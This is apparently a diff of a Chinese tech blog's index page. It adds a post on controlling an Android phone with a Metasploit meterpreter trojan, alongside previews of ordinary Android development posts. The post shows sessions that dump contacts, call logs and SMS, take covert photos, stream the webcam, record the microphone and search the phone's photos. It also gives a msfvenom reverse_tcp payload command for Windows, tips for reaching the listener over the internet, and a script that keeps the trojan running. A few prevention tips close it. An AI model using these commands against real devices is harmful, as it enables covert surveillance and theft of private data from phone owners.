class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    app_install    Request to install apk file</span><br><span class="line">    app_list       List installed apps in the device</span><br><span class="line">    app_run        Start Main Activty for package name</span><br><span class="line">    app_uninstall  Request to uninstall application</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h3><h5 id="获取手机通讯录"><a href="#获取手机通讯录" class="headerlink" title="获取手机通讯录"></a>获取手机通讯录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; dump_contacts</span><br><span class="line">[*] Fetching 2 contacts into list</span><br><span class="line">[*] Contacts list saved to: contacts_dump_20200917195142.txt</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>在电脑目录多了一个contacts_dump_20200917195142.txt的文件，打开如图所示<br><img src="http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E9%80%9A%E8%AE%AF%E5%BD%95" alt="image"></p>
+<h5 id="获取手机通话记录"><a href="#获取手机通话记录" class="headerlink" title="获取手机通话记录"></a>获取手机通话记录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; dump_calllog</span><br><span class="line">[*] Fetching 9 entries</span><br><span class="line">[*] Call log saved to calllog_dump_20200917195408.txt</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>在电脑目录多了一个calllog_dump_20200917195408.txt的文件，打开如图所示<br><img src="http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95" alt="image"></p>
+<h5 id="获取手机短信"><a href="#获取手机短信" class="headerlink" title="获取手机短信"></a>获取手机短信</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; dump_sms</span><br><span class="line">[*] Fetching 6 sms messages</span><br><span class="line">[*] SMS messages saved to: sms_dump_20200917195455.txt</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>在电脑目录多了一个sms_dump_20200917195455.txt的文件，打开如图所示<br><img src="http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E7%9F%AD%E4%BF%A1.png" alt="image"></p>
+<h5 id="拍照"><a href="#拍照" class="headerlink" title="拍照"></a>拍照</h5><p>获取摄像头列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">1: Back Camera</span><br><span class="line">2: Front Camera</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>表示有两个摄像头，前置和后置，如果想要用前置摄像头拍</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -i 2</span><br><span class="line">[*] Starting...</span><br><span class="line">[+] Got frame</span><br><span class="line">[*] Stopped</span><br><span class="line">Webcam shot saved to: &#x2F;Users&#x2F;laibinzhi&#x2F;VEduPltE.jpeg</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>在电脑目录多了一个VEduPltE.jpeg的图片，打开如图所示<br><img src="http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E5%81%B7%E6%8B%8D.jpeg" alt="image"></p>
+<p>同样的，后置摄像头就把2改为1</p>
+<h5 id="录像"><a href="#录像" class="headerlink" title="录像"></a>录像</h5><p>支持实时的一帧帧的照片组成的视频,下面是一些配置参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d &lt;opt&gt;  The stream duration in seconds (Default: 1800)</span><br><span class="line">    -h        Help Banner</span><br><span class="line">    -i &lt;opt&gt;  The index of the webcam to use (Default: 1)</span><br><span class="line">    -q &lt;opt&gt;  The stream quality (Default: &#39;50&#39;)</span><br><span class="line">    -s &lt;opt&gt;  The stream file path (Default: &#39;znKDlLHK.jpeg&#39;)</span><br><span class="line">    -t &lt;opt&gt;  The stream player path (Default: AXrBlNIK.html)</span><br><span class="line">    -v &lt;opt&gt;  Automatically view the stream (Default: &#39;true&#39;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_stream -d 3000 -i 2</span><br><span class="line">[*] Starting...</span><br><span class="line">[*] Preparing player...</span><br><span class="line">[*] Opening player at: &#x2F;Users&#x2F;laibinzhi&#x2F;BXVgcrka.html</span><br><span class="line">[*] Streaming...</span><br></pre></td></tr></table></figure>
+<p>在电脑浏览器打开一个网页显示，如图<br><img src="http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E6%91%84%E5%83%8F.png" alt="image"></p>
+<h5 id="窃听"><a href="#窃听" class="headerlink" title="窃听"></a>窃听</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; record_mic -d 10</span><br><span class="line">[*] Starting...</span><br><span class="line">[*] Stopped</span><br><span class="line">Audio saved to: &#x2F;Users&#x2F;laibinzhi&#x2F;jRKKqgWB.wav</span><br></pre></td></tr></table></figure>
+<p>同样在电脑桌面多了一个wav音频文件，为10秒钟的窃听数据。</p>
+<h5 id="文件的上传和下载"><a href="#文件的上传和下载" class="headerlink" title="文件的上传和下载"></a>文件的上传和下载</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -d &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;DCIM&#x2F;Camera -f *.jpg</span><br><span class="line">Found 7 results...</span><br><span class="line">    &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;DCIM&#x2F;Camera&#x2F;IMG_20191031_160023.jpg (5423142 bytes)</span><br><span class="line">    &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;DCIM&#x2F;Camera&#x2F;IMG_20191118_185509.jpg (5949546 bytes)</span><br><span class="line">    &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;DCIM&#x2F;Camera&#x2F;IMG_20191118_185524.jpg (5735779 bytes)</span><br><span class="line">    &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;DCIM&#x2F;Camera&#x2F;IMG_20200917_102718.jpg (8895869 bytes)</span><br><span class="line">    &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;DCIM&#x2F;Camera&#x2F;IMG_20200917_105937.jpg (4652128 bytes)</span><br><span class="line">    &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;DCIM&#x2F;Camera&#x2F;IMG_20200917_105941.jpg (4666146 bytes)</span><br><span class="line">    &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;DCIM&#x2F;Camera&#x2F;IMG_20200917_111307.jpg (4892873 bytes)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>通过search命令，获取手机的内容，比如图片<br>再通过download和upload命令，可以把手机上面的照片下载</p>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows?"></a>windows?</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.0.0.101  LPORT&#x3D;5555 x &gt; &#x2F;Users&#x2F;laibinzhi&#x2F;Downloads&#x2F;mua.exe</span><br></pre></td></tr></table></figure>
+<h3 id="怎么外网访问监听？"><a href="#怎么外网访问监听？" class="headerlink" title="怎么外网访问监听？"></a>怎么外网访问监听？</h3><p>1.使用vps转发来达到上线目的。</p>
+<p>2.使用Ngrok等工具做内网穿透。</p>
+<h3 id="掉线问题"><a href="#掉线问题" class="headerlink" title="掉线问题"></a>掉线问题</h3><p>自写守护脚本，用shell运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># !&#x2F;bin&#x2F;bash</span><br><span class="line">while:</span><br><span class="line">do am start --user 0 -a com.intent.MAIN -n com.lbz.testmsfdemo&#x2F;.MainActivity</span><br><span class="line">sleep 30</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><ol>
+<li>请勿随意连上陌生wifi</li>
+<li>下载应用程序要在官方渠道下载</li>
+<li>手机不要root</li>
+<li>手机app授权要谨慎</li>
+<li>打包应用程序的时候安装包加固以免被不法分子反编译</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/09/18/%E5%BA%94%E7%94%A8MSF%E5%9F%9F%E5%86%85%E6%B8%97%E9%80%8F%E6%A3%80%E6%B5%8BAndroid%E6%89%8B%E6%9C%BA/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Jetpack-Room-WorkManager在Android架构组件下的实战" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/19/Jetpack-Room-WorkManager%E5%9C%A8Android%E6%9E%B6%E6%9E%84%E7%BB%84%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%AE%9E%E6%88%98/">Jetpack Room+WorkManager在Android架构组件下的实战</a>
+    </h1>
+  
+
+        
+        <a href="/2020/08/19/Jetpack-Room-WorkManager%E5%9C%A8Android%E6%9E%B6%E6%9E%84%E7%BB%84%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%AE%9E%E6%88%98/" class="archive-article-date">
+  	<time datetime="2020-08-19T02:53:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在空闲的时候，就要写代码来巩固以下自己的知识体系。所以呢，使用Room和WorkManager在Android架构组件下，实现一个查看Task列表，左滑右滑删除item，新建附带提醒功能的Task的App。</p>
+<p>本文会牵涉以下知识点</p>
+<ul>
+<li>Android架构组件</li>
+<li>Jetpack - Room</li>
+<li>Jetpack - WorkManager</li>
+<li>Kotlin Coroutines</li>
+<li>Recyclerview 自定义左滑右滑事件的实现</li>
+</ul>
+        
+          <a class="article-more-a" href="/2020/08/19/Jetpack-Room-WorkManager%E5%9C%A8Android%E6%9E%B6%E6%9E%84%E7%BB%84%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%AE%9E%E6%88%98/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Jetpack</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Kotlin</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Room</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">WorkManager</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/08/19/Jetpack-Room-WorkManager%E5%9C%A8Android%E6%9E%B6%E6%9E%84%E7%BB%84%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%AE%9E%E6%88%98/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Jetpack-WorkManager了解和使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -674,356 +1099,6 @@
 
 
   
-    <article id="post-抢票神器-12306分流抢票" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/30/%E6%8A%A2%E7%A5%A8%E7%A5%9E%E5%99%A8-12306%E5%88%86%E6%B5%81%E6%8A%A2%E7%A5%A8/">抢票神器-12306分流抢票</a>
-    </h1>
-  
-
-        
-        <a href="/2018/09/30/%E6%8A%A2%E7%A5%A8%E7%A5%9E%E5%99%A8-12306%E5%88%86%E6%B5%81%E6%8A%A2%E7%A5%A8/" class="archive-article-date">
-  	<time datetime="2018-09-30T09:45:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ol>
-<li>下载软件，去到官网<a target="_blank" rel="noopener" href="https://www.12306bypass.com/">https://www.12306bypass.com/</a>，点击下载。</li>
-<li>安装软件</li>
-<li>登录，使用12306账号登录，服务器选择你所在城市的运营商。</li>
-</ol>
-        
-          <a class="article-more-a" href="/2018/09/30/%E6%8A%A2%E7%A5%A8%E7%A5%9E%E5%99%A8-12306%E5%88%86%E6%B5%81%E6%8A%A2%E7%A5%A8/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/30/%E6%8A%A2%E7%A5%A8%E7%A5%9E%E5%99%A8-12306%E5%88%86%E6%B5%81%E6%8A%A2%E7%A5%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Android与WebView的js交互" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/29/Android%E4%B8%8EWebView%E7%9A%84js%E4%BA%A4%E4%BA%92/">Android与WebView的js交互</a>
-    </h1>
-  
-
-        
-        <a href="/2018/09/29/Android%E4%B8%8EWebView%E7%9A%84js%E4%BA%A4%E4%BA%92/" class="archive-article-date">
-  	<time datetime="2018-09-29T09:40:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="WebView调用调用Java方法"><a href="#WebView调用调用Java方法" class="headerlink" title="WebView调用调用Java方法"></a>WebView调用调用Java方法</h1><ol>
-<li>允许WebView加载js</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.getSettings().setJavaScriptEnabled(true);</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>编写js接口类</li>
-</ol>
-        
-          <a class="article-more-a" href="/2018/09/29/Android%E4%B8%8EWebView%E7%9A%84js%E4%BA%A4%E4%BA%92/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安卓</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">WebView</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/29/Android%E4%B8%8EWebView%E7%9A%84js%E4%BA%A4%E4%BA%92/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-在Android应用程序配置Segment" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/14/%E5%9C%A8Android%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AESegment/">在Android应用程序配置Segment</a>
-    </h1>
-  
-
-        
-        <a href="/2018/09/14/%E5%9C%A8Android%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AESegment/" class="archive-article-date">
-  	<time datetime="2018-09-14T06:59:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="1-什么是Segment"><a href="#1-什么是Segment" class="headerlink" title="1.什么是Segment?"></a>1.什么是Segment?</h2><p> Segment是一个单一平台，只需轻按一下开关，即可将用户数据收集，存储和路由到数百个工具。</p>
-<p>它会为我们处理混乱的分析安装过程，因此我们可以将更多时间用于处理数据，减少跟踪时间。</p>
-        
-          <a class="article-more-a" href="/2018/09/14/%E5%9C%A8Android%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AESegment/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安卓</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">数据分析</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Segment</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Google Analytics</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/14/%E5%9C%A8Android%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AESegment/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Android插件化原理简述" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/17/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0/">Android插件化原理简述</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/17/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0/" class="archive-article-date">
-  	<time datetime="2018-08-17T07:18:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="插件化技术出现背景"><a href="#插件化技术出现背景" class="headerlink" title="插件化技术出现背景"></a>插件化技术出现背景</h2><ul>
-<li><h4 id="APP体积越来越庞大，功能模块越来越多"><a href="#APP体积越来越庞大，功能模块越来越多" class="headerlink" title="APP体积越来越庞大，功能模块越来越多"></a>APP体积越来越庞大，功能模块越来越多</h4></li>
-<li><h4 id="模块耦合度高，协同开发沟通成本极大"><a href="#模块耦合度高，协同开发沟通成本极大" class="headerlink" title="模块耦合度高，协同开发沟通成本极大"></a>模块耦合度高，协同开发沟通成本极大</h4></li>
-<li><h4 id="方法数可能查过65535，占用内存过大"><a href="#方法数可能查过65535，占用内存过大" class="headerlink" title="方法数可能查过65535，占用内存过大"></a>方法数可能查过65535，占用内存过大</h4>
-        
-          <a class="article-more-a" href="/2018/08/17/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安卓</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">插件化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/17/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
@@ -1247,6 +1322,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">RxJava</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">JVM</a>
               </li>
             
             <div class="clearfix"></div>
